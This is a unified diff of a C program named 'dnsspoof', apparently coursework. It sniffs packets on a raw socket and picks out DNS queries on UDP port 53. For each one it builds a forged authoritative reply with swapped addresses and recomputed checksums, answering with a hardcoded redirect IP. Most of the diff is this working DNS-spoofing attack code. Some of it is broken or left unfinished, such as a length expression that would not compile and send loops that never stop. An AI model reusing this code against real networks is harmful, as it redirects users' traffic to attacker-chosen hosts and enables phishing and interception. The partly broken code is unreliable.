@@ -7,35 +7,209 @@
 
 #include "node.h"
 
+
+struct send_dns *craft_dns_hack(char *buffer, uint32_t red) {
+
+	struct dnsPacket *dnspart = (struct dnshdr *) (buffer+ETH_HS+IP_HS+UDP_HS);
+
+	char *reply_packet = NULL;
+	reply_packet = malloc(4096); //change
+
+	struct dns_answer_section answer;
+	memset(&answer,0,sizeof(struct dns_answer_section));
+	struct dnshdr header;
+
+	header.xid = dnspart->dns_hdr.xid;
+	header.qr = 1;
+	header.opcode = 0;
+	header.aa = 1;
+	header.tc = 0;
+	header.rd = 0;
+	header.ra = 0;
+	header.z = 0;
+	header.rcode = 0;
+
+	header.num_questions = htons(1);
+	header.num_answers = htons(1);
+	header.num_authority = 0;
+	header.num_additional = 0;
+
+	memcpy(reply_packet, &header, sizeof(header));
+
+
+	char *counter = (char *)&dnspart->dns_qus;
+
+    int count = 0;
+    while (*(uint8_t *)counter) {
+    	uint8_t size = *(uint8_t *)counter;
+    	counter += (size + 1);
+    	count  += (size + 1);
+    }
+    ++count;
+
+    memcpy(reply_packet+DNS_HS, &dnspart->dns_qus, count);
+    memcpy(reply_packet+DNS_HS+count, counter+1, sizeof(uint16_t));
+    memcpy(reply_packet+DNS_HS+count+2, counter+1 + 2, 2);//??
+
+    char *anwPtr = reply_packet + DNS_HS + count + (2*sizeof(uint16_t));
+    memcpy( anwPtr, &dnspart->dns_qus, count );
+	// Copy in the type, where A = 1
+	uint16_t type = htons(1);
+	memcpy( anwPtr + count, &type, sizeof(uint16_t) );
+	// Copy in the class, IN = 1
+	memcpy( anwPtr + count + sizeof(type), &type, sizeof(uint16_t) );
+	// Copy in TTL
+	uint32_t ttl = htonl(1);
+	memcpy( anwPtr + count + (2*sizeof(type)), &ttl, sizeof(uint32_t) );
+	// Copy in rdlength = 4 for out purpose
+	uint16_t rdlength = htons(4);
+	memcpy( anwPtr + count + (2*sizeof(type)) + sizeof(ttl), &rdlength, sizeof(uint16_t) );
+	// Finally, copy in the spoof
+	memcpy( anwPtr + count + (3*sizeof(type)) + sizeof(ttl), &red, sizeof(uint32_t) );
+
+	int dns_length = DNS_HS + count + 2*(uint16_t) + count + (3*sizeof(type)) + (2*sizeof(ttl));
+
+	struct send_dns *ready_packet = malloc(sizeof(struct send_dns));
+	ready_packet->len = dns_length;
+	ready_packet->payload = reply_packet;
+
+	return ready_packet;
+	/*
+
+	answer.name = htons(DNS_REPLY_NAME);
+	answer.type = htons(dns_type);
+	answer.clss= htons(DNS_CLASS_IN);
+	answer.ttl_top = 0;
+	answer.ttl = htons(DNS_REPLY_TTL);
+	answer.data_len = htons(IPV4_ADDR_LEN);
+
+	int reply_packet_size = 0;
+	reply_packet_size = request_packet_size + ((sizeof(struct dns_answer_section) + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
+	
+
+	*dns_len = reply_packet_size; //????
+//
+	int memcpy_offset = 0;
+	in_addr_t ip_address1 = {0};
+	in_addr_t ip_address2 = {0};
+	ip_address1 = inet_addr("178.249.136.150");//bbc
+	ip_address2 = inet_addr("178.249.136.150");//google
+
+	memcpy(reply_packet,request_packet,request_packet_size);
+
+	memcpy_offset += request_packet_size;
+	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
+	memcpy_offset += sizeof(struct dns_answer_section);
+	memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
+	memcpy_offset += IPV4_ADDR_LEN;
+	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
+	memcpy_offset += sizeof(struct dns_answer_section);
+	memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);
+
+
+	/* Change the number of answers and the flags values of the DNS packet header 
+	struct dnshdr *header = NULL;
+    header = (struct dnshdr *) reply_packet;
+    header->num_answers = htons(DNS_NUM_ANSWERS);
+    header->flags = htons(DNS_REPLY_FLAGS);
+	*/
+    
+}
+void *pack_frame( char* buffer, struct send_dns *dpacket ) {
+
+	struct iphdr *recvd_ip = (struct iphdr *) (buffer + ETH_HS);
+
+	struct iphdr *iph = calloc( 1, IP_HS);
+
+	iph->ihl  = recvd_ip->ihl;
+	iph->version   = recvd_ip->version;
+	iph->tos = recvd_ip->tos;
+	iph->tot_len = IP_HS + UDP_HS + dpacket->len; // Total packet size
+
+	iph->id  = htons( 2323 ); 
+	iph->frag_off = 0;
+	iph->ttl = recvd_ip->ttl;
+	iph->protocol   = recvd_ip->protocol;
+
+	iph->check = 0; 
+	iph->saddr = recvd_ip->daddr;
+	iph->daddr = recvd_ip->saddr;
+	
+	iph->check = ip_sum( (char *) iph, sizeof(struct iphdr) );
+	struct udphdr *recvd_udp = (struct udphdr *) (buffer + ETH_HS + IP_HS);
+	struct udphdr *udph = calloc(1, UDP_HS);
+	udph->source = recvd_udp->dest;
+	udph->dest   = recvd_udp->source;
+	udph->len    = htons( UDP_HS + dpacket->len );
+	udph->check  = 0;
+
+	// Make pseudo header
+	struct pseudo_udp p;
+	p.sudo_src_ip = iph->saddr;
+	p.sudo_dst_ip   = iph->daddr;
+	p.sudo_mbz = 0;
+	p.sudo_prot    = 17;
+
+	p.sudo_udp_len     = htons( UDP_HS + dpacket->len );
+
+	int check_size  = sizeof(struct pseudo_udp) + UDP_HS + dpacket->len;
+
+	char *pseudo_buffer = calloc( 1,check_size );
+
+	memcpy( pseudo_buffer, &p, sizeof( struct pseudo_udp ) );
+	memcpy( pseudo_buffer + sizeof(struct pseudo_udp), udph, UDP_HS);
+	memcpy( pseudo_buffer + sizeof(struct pseudo_udp) + UDP_HS, 
+		dpacket->payload, dpacket->len );
+	
+	udph->check = ip_sum( pseudo_buffer, check_size );
+	free(pseudo_buffer);
+
+	void *ret = calloc(1, sizeof(struct iphdr) + UDP_HS + dpacket->len);
+
+	memcpy(ret, iph, IP_HS);
+	memcpy(ret + IP_HS, udph, UDP_HS);
+	memcpy(ret + IP_HS + UDP_HS, dpacket->payload, dpacket->len);
+
+	free(iph);
+	free(udph);
+
+	return ret;
+}
+
 int main(int argc, char *argv[]) {
 
+
 	//test_udp_checksum();
-	printf("asd");
 	//check correct usage 
 	if(argc < ARGNUM){
 		printf("usage: dnsspoof redirectDomain requestedDomain\n");
 		return EXIT_FAILURE;
 	}
 
-	printf("%s\n", argv[1]);
-
 	//setup raw socket
 	int rawsock = 0, packet_size = 0, on = 1;
-
-	if((rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) ) < 0){
+	//htons(ETH_P_ALL)
+	if((rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
 		perror("socket()");
 		return EXIT_FAILURE;
 	}
+	
+	uint32_t redirect_to = inet_addr("178.249.136.150");
 
- 	if(setsockopt(rawsock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
-	 	printf("setsockopt failed\n");
-	  return EXIT_FAILURE;
+	// we will send using this socket
+	int sock;
+	if ((sock = socket(AF_INET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+		perror("socket()");
+		return EXIT_FAILURE;	
 	}
-
-	if(setsockopt(rawsock,SOL_SOCKET,SO_BINDTODEVICE,"eth0",strlen("eth0")+ 1) < 0){
-		printf("BINDTODEVICE failed\n");
+	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&on, sizeof(int)) < 0){
+		printf("header include failed\n");
 		return EXIT_FAILURE;
 	}
+	struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(80); //change
+	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
 	printf("socket setup successful\n");
 
@@ -45,16 +219,18 @@ int main(int argc, char *argv[]) {
 
 	//for receiving
 	int rx_bytes;
-	char buffer[UDP_RECV_SIZE + 1];
+	char buffer[UDP_RECV_SIZE];
+	char sendBuff[4096]; //change
 	char *domain_name = NULL;
 	struct sockaddr_in clientaddr;
 	int addrlen = sizeof(struct sockaddr_in);
+	struct dns_question_section *query_info = NULL;
 
 	//receive-inspect-act loop
-	while(1){
+	for (;;){
 
 		//receive with errcheck on recvfrom()
-		if( (rx_bytes = recvfrom(rawsock, buffer, UDP_RECV_SIZE, 0,
+		if((rx_bytes = recvfrom(rawsock, buffer, UDP_RECV_SIZE, 0,
 					(struct sockaddr *) &clientaddr, (socklen_t *) &addrlen)) < 0 ){
 			printf("recvfrom() failed\n");
 			return EXIT_FAILURE;
@@ -62,20 +238,61 @@ int main(int argc, char *argv[]) {
 
 		//packet inspection time!
 		struct iphdr *ippart = (struct iphdr *) (buffer+ETH_HS);
-		struct udphdr *udppart = (struct udppart *) (buffer+ETH_HS+IP_HS);
-		struct dnshdr *dnspart = (struct dnshdr *) (buffer+ETH_HS+IP_HS+UDP_HS);
+
+		// Only UDP acceptable
+		if (ippart->protocol != 17) {
+			continue;
+		}
+		struct udphdr *udppart = (struct udppart *) (buffer+ETH_HS+IP_HS);	
+
+		if (ntohs(udppart->dest) != 53) {
+			continue;
+		}
+
+		printf("Received a DNS packet\n");
+		struct send_dns *send_dns= craft_dns_hack(buffer, redirect_to);
+		//if (!send_dns) continue;
+		void* send_packet = pack_frame( buffer, send_dns);
+
+		int bytes_to_send = IP_HS + UDP_HS + send_dns->len;
+
+		int bytes_sent = sendto(sock, send_packet, bytes_to_send, 0,
+									 (struct sockaddr*) &addr, sizeof(addr));
+		if(bytes_sent <= 0) {
+			perror("sendto()");
+			fprintf(stderr, "Send error\n");
+			return -1;
+		}
+
+/*
+
+		
+
 		inet_ntop(AF_INET, ((struct in_addr *)&(ippart->saddr)), src, INET_ADDRSTRLEN);
 		inet_ntop(AF_INET, ((struct in_addr *)&(ippart->daddr)), dest, INET_ADDRSTRLEN);
 		//is this a localhost to localhost packet?
-		if(ippart->saddr==V4_LOCHOST || ippart->daddr==V4_LOCHOST) continue;
 
+		if(ippart->saddr==V4_LOCHOST || ippart->daddr==V4_LOCHOST) {
+			//printf("NOT LOCALHOST\n");
+			continue;
+		}
+
+		if (ippart->version != 4) {
+			continue;
+		}
 		//is this a UDP packet? 
-		if(ippart->protocol != UDP) continue;
+		if(ippart->protocol != UDP) {
+			//printf("NOT UDP\n");
+			continue;	
+		} 
 
 		//TODO is this an outgoing packet? hints: saddr, daddr
 		//TODO is this a DNS packet? hints: dest port has to be 53
-		if(ntohs(udppart->dest) != DNS_PORT && ntohs(udppart->source) != DNS_PORT) continue;
-
+		if(ntohs(udppart->dest) != DNS_PORT && ntohs(udppart->source) != DNS_PORT) {
+			//printf("NOT DNS\n");
+			continue;
+		}
+		/*
 		printf("--------------------------------\n");
 		printf("Intercepted DNS packet of size %d\n",rx_bytes);
 
@@ -91,34 +308,234 @@ int main(int argc, char *argv[]) {
 		printf("\tlen %d\n", ntohs(udppart->len));
 		printf("\tcheck %x\n", ntohs(udppart->check));
 		printf("\t----------\n\n");
-
-
-    	//printf(" [%d ANW]",ntohs(dnspart->num_answers));
-    	//printf(" [%d AUT]",ntohs(dnspart->num_authority));
-    	//printf(" [%d ADD]\n\n",ntohs(dnspart->num_additional));
-		print_dns_packet(dnspart, rx_bytes-UDP_HS-IP_HS-ETH_HS);
-		char *dname = print_dns_packet(dnspart, rx_bytes-UDP_HS-IP_HS-ETH_HS);
-
+		
+		int len = 0;
+		char *dname = print_dns_packet(dnspart, rx_bytes-UDP_HS-IP_HS-ETH_HS, &len);
+		if (dname == NULL) {
+			continue;
+		}
+		printf(_RED_"DOMAIN LEN = %d\n", len);
+		//query_info = (struct dns_question_section *) ((dnspart) + sizeof(struct dnshdr) + strlen(dname) + 1);
 		//this stops program when the right DNS request is received
 		//TODO is this the query we want to spoof?
 
 		//domain_name = get_domain_queried(dnspart, rx_bytes);
 		
-		if(!strcmp(dname, argv[2])){
+		char *cpy = buffer;
+		//if(!strcmp(dname, "www.google.com") || !strcmp(dname, "www.facebook.com") || 
+		//	!strcmp(dname, "www.bbc.co.uk")){
+			
 			printf("found it!\n");
-			return;
-		}
+			/* Process DNS request packets 
+			int packet_size = rx_bytes - ETH_HS - IP_HS - UDP_HS;
+			if(packet_size <= DNS_HS + DNS_QS){
+				printf("Received invalid DNS packet; packet size too small\n");
+				continue;
+			}
 
-		//TODO forge packet and feed it back to the raw socket
+			//struct dns_header *header = malloc(DNS_HS);
+			// DNS header
+			//header = (struct dns_header *) dnspart;
 
+			printf("-------- DNS Header --------\n");
+			printf("\tTransaction id = %d\n", ntohs(dnspart->xid));
+			printf("\tQuestions = %d\n", ntohs(dnspart->num_questions));
+			printf("\tAnswers = %d\n", ntohs(dnspart->num_answers));
+			printf("\tAuthorituies = %d\n", ntohs(dnspart->num_authority));
+			printf("\tAddition = %d\n", ntohs(dnspart->num_additional));
+			//printf("-----------------------\n");
+			/* Only process DNS queries that have one question section 
+			if(ntohs(dnspart->num_questions) != MAX_DNS_QUESTIONS){
+				printf("DNS packet contained the wrong number of questions\n");
+				continue;
+			}
+			
+			//struct dns_question_section *query_info;
+			/* Make sure we got a valid domain query string 
+			if(dname != NULL && strlen(dname) > 0){
+
+				struct dns_question_section *query_info = (struct dns_question_section *) (buffer+ETH_HS+IP_HS+UDP_HS+DNS_HS+len+1);
+				printf("\t---- DNS Question ----\n");
+				printf("\tType = %s\n",(ntohs(query_info->type) == DNS_TYPE_A) ? "TYPE A" : "TYPE NS");
+				printf("\tClass = %s\n",(ntohs(query_info->cls) == DNS_CLASS_IN) ? "CLASS IN" : "UNKNOWN");
+
+				char *request_packet = (buffer+ETH_HS+IP_HS+UDP_HS);
+				int request_packet_size = rx_bytes-UDP_HS-IP_HS-ETH_HS;
+				
+				int dns_len;
+				char *reply_dns_part = NULL;
+				reply_dns_part = pack_dns(dname, rawsock, &clientaddr, ntohs(query_info->type), request_packet, request_packet_size, &dns_len);
+
+				char *reply_udp_part = NULL;
+				reply_udp_part = pack_udp(ippart->saddr, ippart->daddr, udppart, reply_dns_part, dns_len);
+				
+				printf("--------------------- REPLY UDP HEADER ---------------------\n");
+				print_udpheader((struct udphdr *)reply_udp_part);
+
+				char *reply_ip_packet = NULL;
+				int tot_len = dns_len + sizeof(struct iphdr);
+				reply_ip_packet = pack_ip(ippart, tot_len);
+
+				printf("--------------------- REPLY IP HEADER ---------------------\n");
+				print_ipheader((struct iphdr *)reply_ip_packet);
+
+				tot_len = tot_len + UDP_HS + ETH_HS;
+				char *reply_final_packet = malloc(tot_len + UDP_HS + ETH_HS);
+				char *u = reply_final_packet;
+
+				memcpy(u, reply_ip_packet, IP_HS);
+				u += IP_HS;
+
+				memcpy(u, reply_udp_part, UDP_HS);
+				u += UDP_HS;
+
+				memcpy(u, reply_dns_part, dns_len);
+				
+				while (1) {
+					
+					int bytes_sent = sendto(sock,reply_final_packet,tot_len,0,(struct sockaddr *)&addr, sizeof(struct sockaddr_in));
+					if (bytes_sent < 0) {
+						perror("Send Failed\n");
+						break;
+					}
+					//sleep(1);	
+
+				}
+				/*int bytes_sent = sendto(sock,reply_final_packet,tot_len,0,(struct sockaddr *)&addr, sizeof(struct sockaddr_in));
+				if (bytes_sent < 0) {
+					perror("Send Failed\n");
+					break;
+				}
+				//printf("SENT SUCCESSFULL %d BYTES\n", bytes_sent);
+			}
+
+			//return;
+		//}
 		//clean up for next packet
-		memset(buffer, 0, UDP_RECV_SIZE+1);
-		free(domain_name);
+		memset(buffer, 0, UDP_RECV_SIZE);
+		free(domain_name);*/
 	}
+	
 	return 0;
 }
+/*
+char *pack_ip(struct iphdr *h, int tot_size) {
 
-char *print_dns_packet(char *packet, int packet_size){
+	printf("\n--------------- TEST IP HEADER ------------------\n");
+	print_ipheader(h);
+
+	unsigned char *reply_ip_packet = malloc(IP_HS);
+	unsigned char *ptr = reply_ip_packet;
+
+	struct iphdr *s = (struct iphdr *)ptr;
+	memset(s,0,IP_HS);
+	s->version = 4;
+	s->ihl = 5;
+	s->tot_len = (uint16_t)htons(tot_size);
+	s->id = h->id;
+	s->frag_off = h->frag_off;
+	s->ttl = 64;
+	s->protocol = 17;
+	s->check = 0;
+	s->saddr = h->daddr;
+	s->daddr = h->saddr;
+
+	//Checksum
+	int sum = ip_sum(reply_ip_packet, IP_HS);
+	s->check = sum;
+
+	printf(_BGREEN_"IP PACKET ALL SET"_NORMAL_"\n");
+
+	return reply_ip_packet;
+
+}
+
+char *pack_udp(uint32_t srcip, uint32_t destip, struct udphdr *udppart, char *reply_dns_part, int dns_len) {
+
+	printf("\n--------------- TEST UDP HEADER ------------------\n");
+	print_udpheader(udppart);
+
+	char *reply_udp_packet = malloc(UDP_HS);
+	struct udphdr *h = (struct udphdr *)reply_udp_packet;
+	h->source = (uint16_t)htons(53);
+	h->dest = udppart->source;
+	h->len = htons(dns_len);
+
+	//CHECKSUM
+	unsigned char *sudoHdr = (char *)malloc(sizeof(struct pseudo_udp) + dns_len);
+	struct pseudo_udp *t = (struct pseudo_udp *)sudoHdr;
+	t->sudo_src_ip = destip;
+	t->sudo_dst_ip = srcip;
+	t->sudo_mbz = 0;
+	t->sudo_prot = 17;
+	t->sudo_udp_len = htons(UDP_HS + dns_len);
+	t->udp_src_port = htons(53);
+	t->udp_dest_port = udppart->source;
+	t->udp_len = htons(dns_len);
+	t->udp_check = 0;
+	
+	memcpy(sudoHdr+sizeof(struct pseudo_udp),reply_dns_part, dns_len);
+	uint16_t sum = (uint16_t)ip_sum(sudoHdr, UDP_HS + dns_len);
+	h->check = sum;
+
+	printf(_BGREEN_"UDP PACKET ALL SET"_NORMAL_"\n");
+
+	return reply_udp_packet;
+}
+
+char *pack_dns(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size, int *dns_len) {
+
+	char *reply_packet = NULL;
+	struct dns_answer_section answer;
+	memset(&answer,0,sizeof(struct dns_answer_section));
+
+	answer.name = htons(DNS_REPLY_NAME);
+	answer.type = htons(dns_type);
+	answer.clss= htons(DNS_CLASS_IN);
+	answer.ttl_top = 0;
+	answer.ttl = htons(DNS_REPLY_TTL);
+	answer.data_len = htons(IPV4_ADDR_LEN);
+
+	int reply_packet_size = 0;
+	reply_packet_size = request_packet_size + ((sizeof(struct dns_answer_section) + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
+	reply_packet = malloc(reply_packet_size);
+
+	*dns_len = reply_packet_size; //????
+//
+	int memcpy_offset = 0;
+	in_addr_t ip_address1 = {0};
+	in_addr_t ip_address2 = {0};
+	ip_address1 = inet_addr("178.249.136.150");//bbc
+	ip_address2 = inet_addr("178.249.136.150");//google
+
+	memcpy(reply_packet,request_packet,request_packet_size);
+
+	memcpy_offset += request_packet_size;
+	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
+	memcpy_offset += sizeof(struct dns_answer_section);
+	memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
+	memcpy_offset += IPV4_ADDR_LEN;
+	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
+	memcpy_offset += sizeof(struct dns_answer_section);
+	memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);
+
+
+	/* Change the number of answers and the flags values of the DNS packet header 
+	struct dnshdr *header = NULL;
+    header = (struct dnshdr *) reply_packet;
+    header->num_answers = htons(DNS_NUM_ANSWERS);
+    header->flags = htons(DNS_REPLY_FLAGS);
+
+	printf(_BGREEN_"DNS PACKET ALL SET"_NORMAL_"\n");
+
+	printf("\n--------------- REPLY DNS PACKET ---------------------\n");
+	print_dns_packet(reply_packet, reply_packet_size, question_domain);
+
+	return reply_packet;
+
+}
+*/
+char *print_dns_packet(char *packet, int packet_size, int *nameSize){
 
 	printf("\t---DNSHDR:\n");
 	struct dnshdr *dnsheader= packet;
@@ -156,6 +573,7 @@ char *print_dns_packet(char *packet, int packet_size){
 		dname_pointer += part_len;
 	} while(part_len > 0);
 
+	*nameSize = dname_len;
 	printf("\t name length is %d\n",dname_len);
 	struct dns_question_section *question = packet+DNS_HS+dname_len+1;
 
@@ -165,6 +583,8 @@ char *print_dns_packet(char *packet, int packet_size){
 
 	return dname;
 }
+
+
 
 
 /* Extract the domain name from the DNS query packet */
@@ -222,94 +642,6 @@ char *get_domain_queried(char *dns_packet, int packet_size)
 	}
 
 	return domain_name;
-}
-
-/*********************** UDP CHEKCSUM ***********************************
-TEST with : 
-	1. src address : 152.1.51.27 (0x9801, 0x331b) done
-	2. dest address : 152.14.94.75 (0x980e, 0x5e4b) done
-	3. add those together using two's complement -> 0x1c175 done
-	4. protocol type byte is 17or 0x11. done
-	5.  pad that with zero to get 0x0011 done
-	6. UDP length which is 0x000a (10 bytes)  done
-	7. So 0x1c175 + 0x0011 + 0x0! 00a = 0x1c190 
-	8. add the entire UDP datagram : 0xa08f, 0x2694, 0x000a, 0x6262
-	9. 0x1c190 + 0xa08f + 0x2694 + 0x000a + 0x6262 = 0x2eb1f.
-	10. CHEKCSUM SHOULD BE 0x14de
-	pete : 
-*************************************************************************/
-void test_udp_checksum() {
-	//total len = 73
-	//UDP checksum must be = 0xce5f
-	//IP checksum = 0xb74b
-	uint32_t srcip;
-	uint32_t dstip;
-
-	inet_pton(AF_INET, "192.168.1.7", (struct sockaddr_in *) &srcip);
-	inet_pton(AF_INET, "192.168.1.1", (struct sockaddr_in *) &dstip);
-	srcip = htonl(srcip);
-	dstip = htonl(dstip);
-
-	struct pseudo_udp *sudoHdr = malloc(sizeof(struct iphdr));
-	//memset(sudoHdr, 0, sizeof(struct pseudo_udp));
-
-	//1. IP pseudo header
-	memcpy(&(sudoHdr->sudo_src_ip), &srcip, sizeof(uint32_t));
-	memcpy(&(sudoHdr->sudo_dst_ip), &dstip, sizeof(uint32_t));
-	sudoHdr->sudo_mbz = (uint8_t)(0);
-	sudoHdr->sudo_prot = (uint8_t)(17);
-	sudoHdr->sudo_udp_len = (uint16_t)(10); //udp len is 10 bytes
-	// UDP header
-	sudoHdr->udp_header.source = (uint16_t)(28880);
-	sudoHdr->udp_header.dest = (uint16_t)(53);
-	sudoHdr->udp_header.len = (uint16_t)(53);
-	sudoHdr->udp_header.check = 0;
-
-	// ----------- Payload ------------
-	//1. (DNS header)
-	struct dnshdr *dns = malloc(sizeof(struct dnshdr));
-	dns->xid = 0x1744;
-	dns->flags = 0x0100;
-	dns->num_questions = 1;
-	dns->num_answers = 0;
-	dns->num_authority = 0;
-	dns->num_additional = 0;
-
-	// Query -> Domain name
-	char domain_name[] = {
-		0x03, 0x32, 0x34, 0x36, 
-		0x03, 0x32, 0x32, 0x36, 0x03, 0x31, 0x32, 0x35, 
-		0x02, 0x37, 0x34, 0x07, 0x69, 0x6e, 0x2d, 0x61, 
-		0x64, 0x64, 0x72, 0x04, 0x61, 0x72, 0x70, 0x61, 
-		0x00
-	};
-
-	// Query -> Question
-	struct dns_question_section *qus = malloc( sizeof(struct dns_question_section));
-	qus->type = 0x000c; //PTR
-	qus->cls = DNS_CLASS_IN; //0x0001
-
-	
-	unsigned char *tmp = sudoHdr->payload;
-	memcpy(tmp, dns, sizeof(struct dnshdr));
-	tmp += sizeof(struct dnshdr);
-	memcpy(tmp, domain_name, strlen(domain_name));
-	tmp += strlen(domain_name);
-	memcpy(tmp, qus, sizeof(struct dns_question_section));
-
-	char *p = sudoHdr;
-	char *packet = malloc( sizeof(struct pseudo_udp));
-	
-	memcpy(packet, sudoHdr, sizeof(struct pseudo_udp));
-
-	
-	int check = ip_sum(packet, sizeof(struct pseudo_udp));
-	printf("checksum = %x\n", check);		
-
-	//printf("src = %x\n", sudoHdr->sudo_udp_len);		
-	//printf("src = %x\n", sudoHdr->sudo_mbz);	
-	//printf("src = %x\n", sudoHdr->sudo_src_ip);
-	//printf("src = %x\n", sudoHdr->sudo_dst_ip);
 }
 
 int ip_sum(char* packet, int n) {
@@ -384,227 +716,7 @@ char *receive(int lsock, int *rx_bytes, struct sockaddr_in *clientaddr)
 	return buffer;
 }
 
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
-//--------------------------------------------------------------------------------
 
-
-/* Create DNS reply packet and send it to the client */
-int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size, char *cpy)
-{
-	char *reply_packet = NULL, *fqdn = NULL;
-	struct dnshdr *header = NULL;
-	struct dns_answer_section answer;
-	int reply_packet_size = 0;
-	int answer_size = sizeof(struct dns_answer_section);
-	int bytes_sent = 0;
-	int memcpy_offset = 0;
-	in_addr_t ip_address1 = {0};
-	in_addr_t ip_address2 = {0};
-
-	/* Zero out the answer section structure */
-	memset(&answer,0,sizeof(struct dns_answer_section));
-
-	//fqdn = config_get_fqdn();
-	//MASKARi
-	//fqdn = "www.facebook.com";
-	//BBC IP 212.58.251.195
-
-	/* Check to make sure the packet size is of a valid length */
-	if(request_packet_size > ((int) (sizeof(struct dnshdr) + sizeof(struct dns_question_section)) + (int) strlen(question_domain))){
-
-		 //maskari TODO
-		 ip_address2 = inet_addr("212.58.251.195");//bbc
-		 ip_address1 = inet_addr("74.125.226.212");//google
-
-		/* Create the DNS answer section */
-		answer.name = htons(DNS_REPLY_NAME);
-		answer.type = dns_type;
-		answer.clss= htons(DNS_CLASS_IN);
-		answer.ttl = htons(DNS_REPLY_TTL);
-
-		if(dns_type == htons(DNS_TYPE_A)){
-
-			/* Data is an IPv4 address */
-			answer.data_len = htons(IPV4_ADDR_LEN);
-
-			/* DNS response packet consists of the original DNS query plus the answer section,
-			 * plus the answer data (an IPv4 address). We have two IP addresses, so there are
-			 * two answer sections.
-			 */
-			reply_packet_size = request_packet_size + ((answer_size + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
-			if((reply_packet = malloc(reply_packet_size)) != NULL){
-
-				/* Memcpy packet data into the reply packet */
-				memcpy(reply_packet,request_packet,request_packet_size);
-				memcpy_offset += request_packet_size;
-				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
-				memcpy_offset += answer_size;
-				memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
-				memcpy_offset += IPV4_ADDR_LEN;
-				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
-				memcpy_offset += answer_size;
-				memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);
-
-			} else {
-				perror("Malloc Failure");
-				return 0;
-			}
-
-		} else if(dns_type == htons(DNS_TYPE_NS)){
-
-			answer.data_len = htons(NS_NAME_LEN);
-
-			reply_packet_size = request_packet_size + ((answer_size + NS_NAME_LEN) * DNS_NUM_ANSWERS);
-			if((reply_packet = malloc(reply_packet_size)) != NULL){
-
-				/* Memcpy packet data into the reply packet */
-				memcpy(reply_packet,request_packet,request_packet_size);
-				memcpy_offset += request_packet_size;
-				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
-				memcpy_offset += answer_size;
-				memcpy(reply_packet+memcpy_offset,NS_NAME_ONE,NS_NAME_LEN);
-				memcpy_offset += NS_NAME_LEN;
-				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
-				memcpy_offset += answer_size;
-				memcpy(reply_packet+memcpy_offset,NS_NAME_TWO,NS_NAME_LEN);
-
-			} else {
-				perror("Malloc Failure");
-				return 0;
-			}
-		}
-
-		/* Change the number of answers and the flags values of the DNS packet header */
-        header = (struct dnshdr*) reply_packet;
-        header->num_answers = htons(DNS_NUM_ANSWERS);
-        header->flags = htons(DNS_REPLY_FLAGS);
-		
-		printf(_BGREEN_"FINAL STEP : Ready to send ..."_NORMAL_"\n");
-
-		printf("\t1.making IP header ... \n");
-		
-		//received IP header
-		struct iphdr *her_ip_hdr;
-		her_ip_hdr = (struct iphdr *)malloc(sizeof(struct iphdr));
-		decapsulate_fromip(cpy, &her_ip_hdr);
-		print_ipheader(her_ip_hdr);
-
-		//new IP header
-		struct iphdr *ma_ip_hdr;
-		ma_ip_hdr = (struct iphdr *)malloc(sizeof(struct iphdr));
-		memset(ma_ip_hdr,0,sizeof(struct iphdr));
-		int packetsize = sizeof(struct iphdr) + sizeof(struct udphdr) + reply_packet_size;
-		printf("TOTAL PACKET SIZE = %d\n", packetsize);
-
-		ma_ip_hdr->version = her_ip_hdr->version;
-		ma_ip_hdr->ihl = her_ip_hdr->ihl;
-		ma_ip_hdr->tot_len = htons(packetsize);
-		ma_ip_hdr->ttl = her_ip_hdr->ttl;//??
-		ma_ip_hdr->protocol = her_ip_hdr->protocol;
-		//NOTE : swapping addresses
-		ma_ip_hdr->saddr = her_ip_hdr->daddr;
-		ma_ip_hdr->daddr = her_ip_hdr->saddr;
-
-		//her UDP header
-		struct udphdr *her_udp = malloc(sizeof(struct udphdr));
-		cpy += sizeof(struct iphdr);
-		char *p = cpy;
-		memcpy(&(her_udp->source), p, sizeof(uint16_t));
-		p= p + sizeof(uint8_t)*2;
-		memcpy(&(her_udp->dest), p, sizeof(uint16_t));
-		p= p + sizeof(uint8_t)*2;
-		memcpy(&(her_udp->len), p, sizeof(uint16_t));
-		p= p + sizeof(uint8_t)*2;
-		memcpy(&(her_udp->check), p, sizeof(uint16_t));
-		
-		print_udpheader(her_udp,1);
-
-		//ma UDP header
-		struct udphdr *ma_udp = malloc(sizeof(struct udphdr));
-		memset(ma_ip_hdr,0,sizeof(struct iphdr));
-		int udpsize = sizeof(struct udphdr) + reply_packet_size;
-		printf("UDP+DATA PACKET SIZE = %d\n", udpsize);
-	
-		ma_udp->source = htons(53); //spoofed
-		ma_udp->dest =  htons(her_udp->dest);
-		ma_udp->len = htons(udpsize);
-		ma_udp->check = htons(her_udp->check); //wrong TODO
